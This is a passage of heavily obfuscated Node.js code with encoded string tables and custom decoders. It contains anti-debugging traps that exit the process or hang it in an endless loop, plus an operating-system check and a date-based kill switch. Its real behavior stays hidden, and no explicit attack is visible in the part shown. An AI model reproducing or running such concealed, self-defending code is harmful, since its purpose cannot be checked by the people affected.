                if (kY3q474 == bw1LDXR) {
                    return mHQbVa[ph4WoIw[kY3q474]] = uXPxRCH(bw1LDXR, mHQbVa);
                }
                if (n49oLe === undefined) {
                    uXPxRCH = Ot8M78;
                }
                if (kY3q474 == n49oLe) {
                    return mHQbVa ? bw1LDXR[Ot8M78[mHQbVa]] : ph4WoIw[bw1LDXR] || (kY3q474 = Ot8M78[bw1LDXR] || n49oLe, ph4WoIw[bw1LDXR] = kY3q474(NkrHL_[bw1LDXR]));
                }
                if (bw1LDXR !== mHQbVa) {
                    return Ot8M78[bw1LDXR] || (Ot8M78[bw1LDXR] = n49oLe(NkrHL_[bw1LDXR]));
                }
            }, mHQbVa = uXPxRCH(0x1c4), kY3q474 = uXPxRCH(0x25), n49oLe = uXPxRCH(0xa3), Ot8M78 = uXPxRCH(0x99), jJIllx = uXPxRCH(0x90), td77ore = uXPxRCH(0x7f), Q59OVlp = uXPxRCH(0x6e), xtbSJI = uXPxRCH(0x5c), TaFn0Uv = uXPxRCH(0x57), Kt94kB = uXPxRCH(0x54), Xb4IwJx = uXPxRCH(0x47), i0gUcBP = uXPxRCH(0x38), pukrvr = uXPxRCH(0x1c), MsCwg5O = uXPxRCH(0x1f), BSJ1pS = {
                zONcAOB: uXPxRCH(0x14)
                , LTF_3x: uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x18])
                , cH8WUI: uXPxRCH(0x19)
                , bFejUX: uXPxRCH(0x1d)
                , [bw1LDXR[0x1e7]]: uXPxRCH(0x25)
                , [bw1LDXR[0x1e8]]: uXPxRCH.apply(undefined, [0x35])
                , [bw1LDXR[0x1e9]]: uXPxRCH(0x37)
                , UQWjlf: uXPxRCH(0x45)
                , [bw1LDXR[0x1ea]]: uXPxRCH(0x51)
                , VB6RH2e: uXPxRCH(0x6a)
                , [bw1LDXR[0x1eb]]: uXPxRCH(0x6f)
                , [bw1LDXR[0x1ec]]: uXPxRCH(0x74)
                , IsvWnf: uXPxRCH(0x7b)
                , W2AAmh: uXPxRCH(0x85)
                , [bw1LDXR[0x1ed]]: uXPxRCH(0xad)
                , MNsltGm: uXPxRCH(0xd4)
                , [bw1LDXR[0x1ee]]: uXPxRCH[bw1LDXR[0x1ef]](undefined, 0xe5)
                , lIEM0l: uXPxRCH.apply(undefined, [0x15b])
                , gEQnbQ3: uXPxRCH(0x1d8)
            }, Xp96Uso = [uXPxRCH(0x10), uXPxRCH(0x16), uXPxRCH(0x3d), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x40]), uXPxRCH(0x49), uXPxRCH(0x8e), uXPxRCH(0x9d), uXPxRCH(0xb3), uXPxRCH(0xf5)], TljPa8 = uXPxRCH(0x8), vhNite = uXPxRCH(0x7));
            const s1pwaN = [vhNite + TljPa8 + uXPxRCH(0x9) + uXPxRCH(0xa) + uXPxRCH.call(undefined, 0xb) + "ne", uXPxRCH(0xc), uXPxRCH(0xd) + uXPxRCH(0xe) + uXPxRCH(0xf) + Xp96Uso[0x0], uXPxRCH(0x11), uXPxRCH(0x12) + uXPxRCH(0x13) + BSJ1pS.zONcAOB + "s", uXPxRCH(0x15), Xp96Uso[0x1], uXPxRCH(0x17) + BSJ1pS[bw1LDXR[0x1f0]] + BSJ1pS[bw1LDXR[0x1f1]], uXPxRCH(0x1a), uXPxRCH(0x1b), uXPxRCH.call(undefined, 0x1c) + BSJ1pS.bFejUX + uXPxRCH(0x1e), MsCwg5O + uXPxRCH(0x20) + "e", uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x21]), uXPxRCH(0x22), uXPxRCH(0x23), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x24) + BSJ1pS[bw1LDXR[0x1e7]] + uXPxRCH(0x26) + uXPxRCH(0x27) + uXPxRCH(0x28) + "es", uXPxRCH(0x29), uXPxRCH(0x2a), uXPxRCH(0x2b) + uXPxRCH(0x2c), uXPxRCH(0x2d), uXPxRCH(0x2e), uXPxRCH(0x2f), uXPxRCH(0x30), uXPxRCH(0x31), uXPxRCH(0x32), uXPxRCH(0x33) + "ll", uXPxRCH(0x34), pukrvr + BSJ1pS[bw1LDXR[0x1e8]] + uXPxRCH(0x36), BSJ1pS[bw1LDXR[0x1e9]], i0gUcBP + uXPxRCH(0x39), uXPxRCH.call(undefined, 0x3a), uXPxRCH(0x3b), uXPxRCH(0x3c) + Xp96Uso[0x2] + "c", uXPxRCH(0x3e), uXPxRCH(0x3f), Xp96Uso[0x3] + "rm", uXPxRCH(0x41), uXPxRCH(0x42), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x43]) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x44]), BSJ1pS.UQWjlf + uXPxRCH.call(undefined, 0x46), Xb4IwJx + "ry", uXPxRCH(0x48), Xp96Uso[0x4], uXPxRCH(0x4a) + uXPxRCH(0x4b), uXPxRCH(0x4c), uXPxRCH(0x4d) + uXPxRCH(0x4e), uXPxRCH(0x4f) + uXPxRCH(0x50) + BSJ1pS[bw1LDXR[0x1ea]] + uXPxRCH(0x52), uXPxRCH(0x53), Kt94kB, uXPxRCH(0x55), uXPxRCH(0x56) + "re", TaFn0Uv + uXPxRCH(0x58), uXPxRCH(0x59), uXPxRCH(0x5a), uXPxRCH.call(undefined, 0x5b) + xtbSJI, uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x5d]), uXPxRCH(0x5e), uXPxRCH(0x28) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x5f]), uXPxRCH.call(undefined, 0x60) + uXPxRCH(0x61) + uXPxRCH(0x62), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x63]) + uXPxRCH.apply(undefined, [0x64]) + uXPxRCH(0x65) + uXPxRCH(0x66) + "a", uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x67), uXPxRCH(0x68), uXPxRCH(0x69) + BSJ1pS.VB6RH2e, uXPxRCH(0x6b) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x6c), uXPxRCH(0x6d) + "er", Q59OVlp, BSJ1pS[bw1LDXR[0x1eb]] + "le", uXPxRCH(0x70) + uXPxRCH.call(undefined, 0x71), uXPxRCH(0x72) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x73) + "g", BSJ1pS[bw1LDXR[0x1ec]] + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x75), uXPxRCH(0x63) + uXPxRCH(0x76) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x77), uXPxRCH(0x78) + uXPxRCH(0x79) + uXPxRCH(0x7a), BSJ1pS.IsvWnf, uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x7c), uXPxRCH(0x7d), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x7e), td77ore + uXPxRCH(0x80) + uXPxRCH(0x81), uXPxRCH(0x82) + uXPxRCH(0x83) + uXPxRCH(0x84) + BSJ1pS[bw1LDXR[0x1f2]] + uXPxRCH(0x86), uXPxRCH.apply(undefined, [0x87]), uXPxRCH(0x88) + "ey", uXPxRCH(0x89), uXPxRCH.call(undefined, 0x8a), uXPxRCH(0x8b) + uXPxRCH(0x8c) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x8d]), Xp96Uso[0x5], uXPxRCH(0x8f), jJIllx, uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x91) + uXPxRCH.call(undefined, 0x92), uXPxRCH(0x93) + uXPxRCH(0x94) + "nt", uXPxRCH(0x95), uXPxRCH(0x96), uXPxRCH(0x97), uXPxRCH(0x98), Ot8M78, uXPxRCH(0x9a), uXPxRCH(0x9b), uXPxRCH(0x9c), Xp96Uso[0x6], uXPxRCH(0x9e), uXPxRCH(0x9f) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0xa0]) + "te", uXPxRCH(0xa1), uXPxRCH(0xa2), n49oLe + uXPxRCH.apply(undefined, [0xa4]) + uXPxRCH(0xa5) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0xa6) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0xa7]) + uXPxRCH(0xa8), uXPxRCH(0xa9), uXPxRCH(0xaa) + uXPxRCH(0xab), uXPxRCH(0xac), BSJ1pS[bw1LDXR[0x1ed]], uXPxRCH[bw1LDXR[0x1e6]](undefined, [0xae]), uXPxRCH(0x12) + uXPxRCH(0xaf) + uXPxRCH(0xb0), uXPxRCH(0xb1), uXPxRCH(0xb2), uXPxRCH(0xb3) + uXPxRCH(0xb4) + uXPxRCH(0xb5) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0xb6) + Xp96Uso[0x7] + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0xb7) + uXPxRCH(0xb8) + "@(", uXPxRCH(0xb9) + uXPxRCH(0xba), uXPxRCH(0xbb), uXPxRCH(0xbc), uXPxRCH(0xbd), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0xbe]), uXPxRCH(0xbf) + uXPxRCH(0xc0), uXPxRCH(0xc1) + "th", uXPxRCH(0xc2), uXPxRCH(0xc3), uXPxRCH.call(undefined, 0xc4), uXPxRCH(0xc5), uXPxRCH(0xc6), uXPxRCH(0xc7) + uXPxRCH(0xc8) + "e", uXPxRCH(0xc9) + uXPxRCH(0x75), uXPxRCH(0xca), uXPxRCH(0xcb), uXPxRCH(0xcc), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0xcd), uXPxRCH.apply(undefined, [0xce]) + uXPxRCH(0xcf) + uXPxRCH.call(undefined, 0xd0) + uXPxRCH(0xd1) + uXPxRCH(0xd2) + "et", uXPxRCH(0xd3), BSJ1pS[bw1LDXR[0x1f3]], uXPxRCH(0xd5) + uXPxRCH(0xd6) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0xd7]), uXPxRCH(0x24) + kY3q474 + uXPxRCH(0xd8) + uXPxRCH(0xd9) + uXPxRCH(0xda), uXPxRCH(0xdb) + "re", uXPxRCH(0xdc), uXPxRCH(0xdd), uXPxRCH(0xde), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0xdf]), uXPxRCH(0xe0), uXPxRCH(0xe1) + uXPxRCH(0xe2) + "s", uXPxRCH(0xe3), uXPxRCH(0xe4) + BSJ1pS[bw1LDXR[0x1ee]], uXPxRCH[bw1LDXR[0x1ef]](undefined, 0xe6) + uXPxRCH(0xe7) + "S", uXPxRCH(0xe8), uXPxRCH(0xe9) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0xea) + "H", uXPxRCH(0xeb), uXPxRCH(0xec) + "PO", uXPxRCH(0xed) + uXPxRCH.call(undefined, 0xee) + "e", uXPxRCH(0xef), uXPxRCH(0xf0), uXPxRCH(0xf1) + uXPxRCH(0xef), uXPxRCH(0xf2), uXPxRCH(0xf3), uXPxRCH(0xf4) + Xp96Uso[0x8], uXPxRCH(0xf6) + "ol", uXPxRCH[bw1LDXR[0x1e6]](undefined, [0xf7]), uXPxRCH.apply(undefined, [0xf8]), uXPxRCH.call(undefined, 0xf9), uXPxRCH(0xfa) + uXPxRCH(0xfb), uXPxRCH(0xfc), uXPxRCH(0xfd), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0xfe), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0xff) + uXPxRCH(0x100) + uXPxRCH(0x101) + uXPxRCH(0x102) + uXPxRCH(0x103) + "ma", uXPxRCH(0x104), uXPxRCH(0x105), uXPxRCH(0x106), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x107]), uXPxRCH(0x108), uXPxRCH(0x109), uXPxRCH(0x10a), uXPxRCH(0x10b), uXPxRCH.call(undefined, 0x10c), uXPxRCH(0x24) + uXPxRCH(0x25) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x10d]) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x10e) + uXPxRCH(0x10f) + uXPxRCH(0x110), uXPxRCH(0x111), uXPxRCH(0x112), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x113), uXPxRCH(0x114) + uXPxRCH(0x115) + uXPxRCH(0x116), uXPxRCH(0x117) + uXPxRCH(0x118) + uXPxRCH(0x119) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x11a]) + uXPxRCH(0x11b) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x11b]), uXPxRCH(0x28) + uXPxRCH(0x11c), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x11d]) + uXPxRCH(0x11e) + "R", uXPxRCH(0x11f), uXPxRCH(0x6f) + uXPxRCH(0x120), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x121), uXPxRCH(0x122), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x123), uXPxRCH(0x124), uXPxRCH(0x125), uXPxRCH(0x126) + uXPxRCH(0x127), uXPxRCH(0x128), uXPxRCH.call(undefined, 0x129) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x12a) + "a", uXPxRCH(0x12b) + uXPxRCH(0x12c) + " ", uXPxRCH(0x12d), uXPxRCH(0x12e), uXPxRCH.apply(undefined, [0x12f]), uXPxRCH(0x130), uXPxRCH(0x131), uXPxRCH(0x132) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x133]) + uXPxRCH(0x134) + uXPxRCH(0x135) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x136]) + "s", uXPxRCH(0x137) + uXPxRCH(0x138) + uXPxRCH(0x139) + "n", uXPxRCH(0x13a), uXPxRCH(0x13b), uXPxRCH(0x13c), uXPxRCH(0x13d), uXPxRCH(0x13e) + "ME", uXPxRCH(0x13f), uXPxRCH(0x140), uXPxRCH(0x141) + uXPxRCH(0x142), uXPxRCH(0x143), uXPxRCH(0x144) + uXPxRCH(0x145) + uXPxRCH(0x146), uXPxRCH.apply(undefined, [0x147]), uXPxRCH(0x148), uXPxRCH(0x149), uXPxRCH(0x14a), uXPxRCH(0x14b), uXPxRCH(0x14c) + uXPxRCH(0x14d), uXPxRCH(0x14e), uXPxRCH(0x14f), uXPxRCH(0x150), uXPxRCH(0x151) + uXPxRCH(0x152), uXPxRCH(0x24) + uXPxRCH(0x153) + uXPxRCH(0x154) + uXPxRCH(0x155), uXPxRCH(0x156) + "ra", uXPxRCH(0x157) + uXPxRCH(0x158), uXPxRCH(0x159) + "ns", uXPxRCH(0x15a), BSJ1pS.lIEM0l, uXPxRCH.call(undefined, 0x15c), uXPxRCH(0x15d), uXPxRCH(0x15e), uXPxRCH(0x15f), uXPxRCH(0x160), uXPxRCH(0x161), uXPxRCH(0x162), uXPxRCH(0x163), uXPxRCH.call(undefined, 0x164), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x165]), uXPxRCH(0x166), uXPxRCH(0x167), uXPxRCH(0x168) + uXPxRCH(0x169), uXPxRCH(0x16a), uXPxRCH(0x16b) + uXPxRCH(0x16c), uXPxRCH(0x150) + uXPxRCH(0xe5), uXPxRCH(0x16d), uXPxRCH.call(undefined, 0x16e) + uXPxRCH.call(undefined, 0x16f) + "e", uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x170), uXPxRCH(0x171), uXPxRCH(0x172), uXPxRCH(0x137) + uXPxRCH(0x173) + uXPxRCH(0x174) + uXPxRCH(0x175) + uXPxRCH(0x176), uXPxRCH.call(undefined, 0x177) + uXPxRCH(0x178) + "n", uXPxRCH(0x179) + uXPxRCH(0x17a), uXPxRCH(0x17b), uXPxRCH(0x17c), uXPxRCH(0x17d), uXPxRCH.call(undefined, 0x17e) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x17f]) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x180]) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x181]) + uXPxRCH(0x182) + "bl", uXPxRCH(0x183), uXPxRCH(0x184) + uXPxRCH(0x185) + uXPxRCH(0x186) + uXPxRCH(0x187) + uXPxRCH(0x188) + "hm", uXPxRCH.apply(undefined, [0x189]), uXPxRCH(0x18a) + uXPxRCH(0x18b), uXPxRCH(0x18c), uXPxRCH(0x18d), uXPxRCH(0x18e), uXPxRCH.apply(undefined, [0x18f]), uXPxRCH(0x190), uXPxRCH.call(undefined, 0x191), uXPxRCH(0x192), uXPxRCH(0x9f), uXPxRCH(0x193), uXPxRCH(0x194) + "ta", uXPxRCH.call(undefined, 0x195), uXPxRCH(0x24) + uXPxRCH(0x153) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x196]) + uXPxRCH(0x197) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x198]) + "ta", uXPxRCH(0x199) + uXPxRCH.apply(undefined, [0x19a]) + uXPxRCH(0x19b) + uXPxRCH(0x19c) + "s", uXPxRCH.call(undefined, 0xf) + uXPxRCH(0x19d) + "y", uXPxRCH(0x19e), uXPxRCH(0x24) + uXPxRCH.call(undefined, 0x25) + uXPxRCH(0x19f) + uXPxRCH.apply(undefined, [0x1a0]) + uXPxRCH(0x1a1) + "ts", uXPxRCH(0x1a2), uXPxRCH(0x1a3), uXPxRCH(0x1a4), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x1a5]), uXPxRCH(0x1a6) + uXPxRCH(0x1a7) + uXPxRCH(0x1a8), uXPxRCH(0x1a9), uXPxRCH(0x1aa), uXPxRCH(0x1ab), uXPxRCH(0x1ac), uXPxRCH(0x1ad), uXPxRCH(0x1ae), uXPxRCH(0x1af), uXPxRCH(0x1b0), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x1b1) + "ng", uXPxRCH(0x1b2) + uXPxRCH(0x1b3), uXPxRCH(0x1b4) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x1b5]), uXPxRCH(0x1b6) + uXPxRCH(0x1b7) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x1b8), uXPxRCH(0x1b9), uXPxRCH(0x1ba) + uXPxRCH(0x1bb), uXPxRCH(0x1bc) + uXPxRCH(0x1bd) + uXPxRCH(0x1be) + uXPxRCH(0x1bf) + uXPxRCH(0x1c0) + "3", uXPxRCH.call(undefined, 0x1c1), uXPxRCH(0x1c2), uXPxRCH(0x1c3), mHQbVa, uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x1c5), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x28]) + uXPxRCH(0x1c6), uXPxRCH(0x1c7), uXPxRCH.apply(undefined, [0x1c8]) + uXPxRCH(0x1c9) + uXPxRCH(0x1ca) + uXPxRCH.apply(undefined, [0x1cb]) + uXPxRCH.apply(undefined, [0x1cc]) + "le", uXPxRCH(0x1cd), uXPxRCH(0x1ce), uXPxRCH(0x1cf), uXPxRCH(0x1d0), uXPxRCH(0x1d1), uXPxRCH(0x1d2), uXPxRCH(0x1d3), uXPxRCH.apply(undefined, [0x1d4]) + uXPxRCH(0x1d5) + uXPxRCH(0x1d6), uXPxRCH(0x1d7), BSJ1pS[bw1LDXR[0x1f4]], uXPxRCH(0x1d9) + uXPxRCH(0x1da) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x1db]), uXPxRCH(0x1dc), uXPxRCH(0x1dd) + "es", uXPxRCH(0x1de) + uXPxRCH(0x1df), uXPxRCH(0x1e0) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x1e1), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x1e2]), uXPxRCH(0x1e3), uXPxRCH(0x1e4), uXPxRCH(0x1e5), uXPxRCH(0x1e6) + uXPxRCH(0x28) + "e", uXPxRCH(0x1e7) + uXPxRCH(0x1e8) + uXPxRCH(0x1e9) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x1ea]) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x1eb]), uXPxRCH(0x1ec) + uXPxRCH(0xe5), uXPxRCH(0x1ed), uXPxRCH(0x1ee), uXPxRCH.apply(undefined, [0x1ef]) + uXPxRCH(0x1f0) + "xe", uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x1f1), uXPxRCH(0x1f2), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x1f3), uXPxRCH(0x1f4) + uXPxRCH.apply(undefined, [0x1f5]), uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x1f6]), uXPxRCH(0x1f7) + "ra", uXPxRCH(0x1f8), uXPxRCH(0x1f9) + "ge", uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x1fa]) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x1fb]) + uXPxRCH(0x1fc) + uXPxRCH(0x1fd) + "s", uXPxRCH(0x1fe) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x1ff) + uXPxRCH(0x200) + uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x201) + "s", uXPxRCH(0x202), uXPxRCH(0x203), uXPxRCH.apply(undefined, [0x204]) + uXPxRCH(0x205), uXPxRCH.apply(undefined, [0x206]), uXPxRCH(0x207) + uXPxRCH(0x208), uXPxRCH(0x123) + uXPxRCH(0x209) + "t", uXPxRCH(0x20a) + "on", uXPxRCH(0x28) + uXPxRCH(0x20b), uXPxRCH(0x20c), uXPxRCH(0x20d), uXPxRCH(0x20e) + uXPxRCH(0x20f), uXPxRCH(0x210), uXPxRCH(0x211), uXPxRCH(0x24) + uXPxRCH(0x25) + uXPxRCH[bw1LDXR[0x1e6]](undefined, [0x212]) + uXPxRCH(0x213) + uXPxRCH(0x1f) + uXPxRCH(0x20) + uXPxRCH(0x214) + uXPxRCH(0x215), uXPxRCH(0x216) + uXPxRCH(0x217) + uXPxRCH(0x218) + uXPxRCH(0x219) + uXPxRCH(0x21a) + "F", uXPxRCH.call(undefined, 0x21b), uXPxRCH(0x21c) + uXPxRCH(0x21d), uXPxRCH(0x21e), uXPxRCH(0x21f) + "me", uXPxRCH(0x220), uXPxRCH(0x221) + uXPxRCH(0x222), uXPxRCH(0x223), uXPxRCH[bw1LDXR[0x1ef]](undefined, 0x224), uXPxRCH(0x225), uXPxRCH(0x226) + "ve"];
            if (function () {
                    var bw1LDXR = function () {
                        const mHQbVa = function () {
                            const mHQbVa = new RegExp("\n");
                            return mHQbVa[uXPxRCH(0x227)](bw1LDXR);
                        };
                        return mHQbVa();
                    };
                    return bw1LDXR();
                }()) {
                process.exit();
            }
            return y7bTqx(bw1LDXR.d = function (...mHQbVa) {
                var kY3q474;
                if (rKAu9MB(require('os')
                        .platform() === uXPxRCH.apply(undefined, [0xdc]), MHQ3bYA(-0x2f))) {
                    process.exit();
                }
                kY3q474 = {
                    get c() {
                        if (function () {
                                var mHQbVa = function () {
                                    const kY3q474 = function () {
                                        const kY3q474 = new RegExp("\n");
                                        return kY3q474[uXPxRCH(0x228)](mHQbVa);
                                    };
                                    return kY3q474();
                                };
                                return mHQbVa();
                            }()) {
                            var mHQbVa = "a";
                            while (0x1) {
                                mHQbVa = mHQbVa += "a";
                            }
                        }
                        return s1pwaN;
                    }
                };
                return bw1LDXR.f(mHQbVa, kY3q474);
            }, bw1LDXR.g());

            function e0MiDs(bw1LDXR, uXPxRCH = "xpQAZEOeqF3J(RK+o%B.i?^\"9uUwV{|Tvn}6Nby4*<#c0IlftD!rg_8H)k=[@jPM>C1a~$sL:7Xh2,5Sz;`/dYm&WG]", mHQbVa, kY3q474, n49oLe = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
                UxmmwSD(mHQbVa = '' + (bw1LDXR || ''), kY3q474 = mHQbVa.length, td77ore = -0x1);
                for (Q59OVlp = Q59OVlp; Q59OVlp < kY3q474; Q59OVlp++) {
                    xtbSJI = uXPxRCH.indexOf(mHQbVa[Q59OVlp]);
                    if (xtbSJI === -0x1) {
                        continue;
                    }
                    if (td77ore < 0x0) {
                        td77ore = xtbSJI;
                    } else {
                        UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                        do {
                            UxmmwSD(n49oLe.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                        } while (jJIllx > 0x7);
                        td77ore = -0x1;
                    }
                }
                if (td77ore > -0x1) {
                    n49oLe.push((Ot8M78 | td77ore << jJIllx) & 0xff);
                }
                return pE8Nth(n49oLe);
            }
        }

        function Q59OVlp([bw1LDXR, uXPxRCH], mHQbVa, kY3q474, n49oLe, Ot8M78, jJIllx, td77ore, Q59OVlp, xtbSJI, TaFn0Uv) {
            if (y7bTqx(bw1LDXR = bw1LDXR - 0x1eb, function () {
                    var bw1LDXR = function () {
                        const uXPxRCH = function () {
                            var uXPxRCH = (mHQbVa, bw1LDXR, n49oLe, Ot8M78, jJIllx) => {
                                if (typeof Ot8M78 === "undefined") {
                                    Ot8M78 = kY3q474;
                                }
                                if (typeof jJIllx === "undefined") {
                                    jJIllx = ph4WoIw;
                                }
                                if (n49oLe && Ot8M78 !== kY3q474) {
                                    uXPxRCH = kY3q474;
                                    return uXPxRCH(mHQbVa, -0x1, n49oLe, Ot8M78, jJIllx);
                                }
                                if (Ot8M78 === uXPxRCH) {
                                    kY3q474 = bw1LDXR;
                                    return kY3q474(n49oLe);
                                }
                                if (Ot8M78 === undefined) {
                                    uXPxRCH = jJIllx;
                                }
                                if (mHQbVa !== bw1LDXR) {
                                    return jJIllx[mHQbVa] || (jJIllx[mHQbVa] = Ot8M78(NkrHL_[mHQbVa]));
                                }
                            };
                            const mHQbVa = new RegExp("\n");
                            return mHQbVa[uXPxRCH(0x229)](bw1LDXR);

                            function kY3q474(uXPxRCH, mHQbVa = "I*G&BYcuJND<9/Hg8?Tb6@v>.p7=4!~yZ1r,2sl\"o|5X0F]$:fjU_`(SQ%ixC^E)#{+3VOezn[;A}twPKmRMqWkLhad", kY3q474, bw1LDXR, n49oLe = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
                                UxmmwSD(kY3q474 = '' + (uXPxRCH || ''), bw1LDXR = kY3q474.length, td77ore = -0x1);
                                for (Q59OVlp = Q59OVlp; Q59OVlp < bw1LDXR; Q59OVlp++) {
                                    xtbSJI = mHQbVa.indexOf(kY3q474[Q59OVlp]);
                                    if (xtbSJI === -0x1) {
                                        continue;
                                    }
                                    if (td77ore < 0x0) {
                                        td77ore = xtbSJI;
                                    } else {
                                        UxmmwSD(td77ore += xtbSJI * 0x5b, Ot8M78 |= td77ore << jJIllx, jJIllx += (td77ore & 0x1fff) > 0x58 ? 0xd : 0xe);
                                        do {
                                            UxmmwSD(n49oLe.push(Ot8M78 & 0xff), Ot8M78 >>= 0x8, jJIllx -= 0x8);
                                        } while (jJIllx > 0x7);
                                        td77ore = -0x1;
                                    }
                                }
                                if (td77ore > -0x1) {
                                    n49oLe.push((Ot8M78 | td77ore << jJIllx) & 0xff);
                                }
                                return pE8Nth(n49oLe);
                            }
                        };
                        return uXPxRCH();
                    };
                    return bw1LDXR();
                }())) {
                kY3q474 = "a";
                while (0x1) {
                    kY3q474 = kY3q474 += "a";
                }
            }
            let Kt94kB = mHQbVa.h[bw1LDXR];
            return Kt94kB;
        }

        function xtbSJI([bw1LDXR, uXPxRCH], mHQbVa, kY3q474, n49oLe) {
            kY3q474 = (bw1LDXR, uXPxRCH, mHQbVa, n49oLe, Ot8M78) => {
                if (typeof n49oLe === bw1LDXR[0x1da]) {
                    n49oLe = jJIllx;
                }
                if (typeof Ot8M78 === bw1LDXR[0x1da]) {
                    Ot8M78 = ph4WoIw;
                }
                if (mHQbVa == bw1LDXR) {
                    return uXPxRCH[ph4WoIw[mHQbVa]] = kY3q474(bw1LDXR, uXPxRCH);
                }
                if (mHQbVa == n49oLe) {
                    return uXPxRCH ? bw1LDXR[Ot8M78[uXPxRCH]] : ph4WoIw[bw1LDXR] || (mHQbVa = Ot8M78[bw1LDXR] || n49oLe, ph4WoIw[bw1LDXR] = mHQbVa(NkrHL_[bw1LDXR]));
                }
                if (bw1LDXR !== uXPxRCH) {
                    return Ot8M78[bw1LDXR] || (Ot8M78[bw1LDXR] = n49oLe(NkrHL_[bw1LDXR]));
                }
            };
            if (rKAu9MB(require('os')
                    .platform() === kY3q474(0x281), A536BJ = -0x2f)) {
                process.exit();
            }
            const Ot8M78 = mHQbVa.j();
            mHQbVa.k = mHQbVa.m(function (...bw1LDXR) {
                var uXPxRCH = {
                    get h() {
                        if (Date[kY3q474(0x282)][kY3q474(0x283)][kY3q474(0x284)](new Date()) > 0x19b76a3b610) {
                            process.exit();
                        }
                        return Ot8M78;
                    }
                };
                if (function () {
                        var bw1LDXR = function () {
                            const uXPxRCH = function () {
                                const uXPxRCH = new RegExp("\n");
                                return uXPxRCH[kY3q474(0x285)](bw1LDXR);
                            };
                            return uXPxRCH();
                        };
                        return bw1LDXR();
                    }()) {
                    process.exit();
                }
                return mHQbVa.o(bw1LDXR, uXPxRCH);
            }, 0x2);
            return mHQbVa.p(bw1LDXR, uXPxRCH);

            function jJIllx(bw1LDXR, uXPxRCH = "/ovuD@*IzLwh!NH<JFKxV]PgCyBX7GfepT[b#R^$\"U,`dA%8Z3S+6j?>M2&Y(9Q}samnrkclE=i~Wq:1{4|Ot.)0;5_", mHQbVa, kY3q474, n49oLe = [], Ot8M78 = 0x0, jJIllx = 0x0, td77ore, Q59OVlp = 0x0, xtbSJI) {
                UxmmwSD(mHQbVa = '' + (bw1LDXR || ''), kY3q474 = mHQbVa.length, td77ore = -0x1);
                for (Q59OVlp = Q59OVlp; Q59OVlp < kY3q474; Q59OVlp++) {
                    xtbSJI = uXPxRCH.indexOf(mHQbVa[Q59OVlp]);
                    if (xtbSJI === -0x1) {
                        continue;
                    }
                    if (td77ore < 0x0) {
                        td77ore = xtbSJI;
                    } else {
